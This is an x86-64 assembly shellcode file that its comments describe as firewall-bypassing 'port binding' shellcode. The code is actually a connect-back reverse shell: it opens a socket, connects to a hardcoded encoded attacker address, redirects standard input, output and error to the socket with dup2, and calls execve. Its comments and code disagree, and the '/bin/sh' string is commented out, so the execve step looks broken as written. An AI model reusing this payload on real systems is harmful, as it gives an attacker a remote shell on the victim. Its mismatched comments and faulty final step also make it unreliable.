#this is intended to used as port binding shellcode
#it should bypass the firewall and force target to open
#a connection with the attacker and send a shell prompt 
#on the socket ss

.globl _start

_start:

	# s = socket(AF_INET,SOCK_STREAM,0)
	xorq %rax,%rax
	movq $0x2,%rdi
	movq $0x1,%rsi
	xorq %rdx,%rdx
	addb $0x29,%al
	syscall

	movq %rax,%r12

	# connect(s,sockaddr_in,sockaddr_in_len)
	movq %r12,%rdi
	movq $0x01bdbd7f697abd02,%rbx	
	pushq %rbx
	movq %rsp,%rsi
	movb %dl,0x1(%rsi)
	movw %dx,0x5(%rsi)
	movq %rdx,0x8(%rsi)
	addb $0x10,%dl
	movb $0x2a,%al		
	syscall

	
	#write(s,string,len)
	movq %r12,%rdi
	xorq %rsi,%rsi
	xorq %rbx,%rbx
	addq $0x21594548,%rbx
	pushq $0x0
	pushq %rbx
	addq %rsp,%rsi
#	addb $0x2,%dl	
	xorq %rax,%rax
	addb $0x1,%al
	syscall	
	
	# dup2(s,{0,1,2})
	xorq %rax,%rax
	xorq %rdi,%rdi
	addq $0x2,%rsi
	movq %r12,%rdi
	l1:
	movq $0x21,%rax
	syscall
	decq %rsi
	jns l1

	#write(1,hi,2)
	xorq %rax,%rax
	movq $0x1,%rax
	movq $0x4948,%rbx
	pushq %rbx
	movq %rsp,%rsi
	movq $0x1,%rdi
	syscall
	
	
	#execve(*filename,**args,env)
	xorq %rax,%rax
	movq $0x3b,%rax
	#movq /bin/sh,%rbx
	pushq %rbx
	movq %rsp,%rdi
	pushq %rdi
	movq %rsp,%rsi
	xorq %rdx,%rdx
	syscall
